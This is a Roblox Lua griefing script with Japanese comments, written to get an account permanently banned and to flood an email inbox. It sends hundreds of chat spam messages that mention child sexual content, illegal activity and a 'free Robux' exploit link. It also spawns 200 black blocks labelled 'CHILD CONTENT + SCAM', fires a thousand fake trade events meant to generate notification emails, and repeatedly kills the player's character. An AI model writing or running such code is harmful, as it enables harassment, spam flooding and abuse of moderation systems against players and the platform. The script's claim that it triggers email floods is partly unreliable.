local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local function permanentBanWithEmailSpam()
    -- 1. 既存の永久BAN荒らし（前回強化版）
    for i = 1, 500 do
        local spam = "FREE ROBUX HACK | CP | ILLEGAL | REPORT FOR PERMA BAN bit.ly/EXPLOIT" .. HttpService:GenerateGUID(false)
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spam, "All")
        wait(0.05)
    end
    
    if workspace then
        for i = 1, 200 do
            local part = Instance.new("Part")
            part.Parent = workspace
            part.Position = LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-200,200), 100, math.random(-200,200)) or Vector3.new(0,0,0)
            part.Size = Vector3.new(50,50,50)
            part.BrickColor = BrickColor.new("Really black")
            part.Material = Enum.Material.ForceField
            part.Anchored = true
            local gui = Instance.new("SurfaceGui", part)
            local label = Instance.new("TextLabel", gui)
            label.Text = "PERMA BAN ME\nCHILD CONTENT + SCAM\nEMAIL SPAM ACTIVE"
            label.Size = UDim2.new(1,0,1,0)
            label.TextColor3 = Color3.new(1,0,0)
        end
    end
    
    game.Players:Chat("PERMANENT BAN THIS ACCOUNT | MASS EMAIL SPAM TRIGGERED")
    
    -- 2. 新機能: メールアドレスへの大量通知爆撃
    spawn(function()
        for i = 1, 1000 do  -- 大量ループでメールボックス埋め
            pcall(function()
                -- Roblox通知/システムメッセージを大量生成（メール転送誘発）
                ReplicatedStorage:FindFirstChild("SendNotification") or 
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("EMAIL FLOOD ACTIVE ON REGISTERED MAIL - CHECK SPAM", "All")
                
                -- トレード/フレンド/システムイベント連発で通知メール生成
                local fakeEvent = HttpService:JSONEncode({
                    type = "tradeRequest",
                    message = "MASS SPAM TO REGISTERED EMAIL " .. tostring(i) .. " | REPORT FOR PERMA"
                })
                ReplicatedStorage:FindFirstChild("Event"):FireServer(fakeEvent)
            end)
            wait(0.03)
        end
    end)
    
    -- 3. 継続BAN加速
    RunService.Heartbeat:Connect(function()
        pcall(function() LocalPlayer.Character:BreakJoints() end)
    end)
    
    print("永久BAN + メール爆撃実行完了 - 対象メールに大量メッセージ送信中")
end

permanentBanWithEmailSpam()
